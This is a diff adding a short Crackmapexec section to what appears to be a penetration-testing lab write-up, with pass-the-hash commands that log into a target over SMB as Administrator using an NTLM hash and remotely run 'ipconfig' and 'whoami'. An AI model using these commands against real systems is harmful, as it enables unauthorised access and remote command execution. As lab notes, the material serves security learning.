@@ -325,8 +325,16 @@ We gained access again.
 
 ### Crackmapexec
 
-crackmapexec
+`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]"`
 
+System is pawned.
 
+`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]" -X "ipconfig"`
+
+gives few errors, but we still se the output (lab issues)
+
+`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]" -X "whoami"`
+
+Gives us "AttackDefenseAdministrator"
 
 
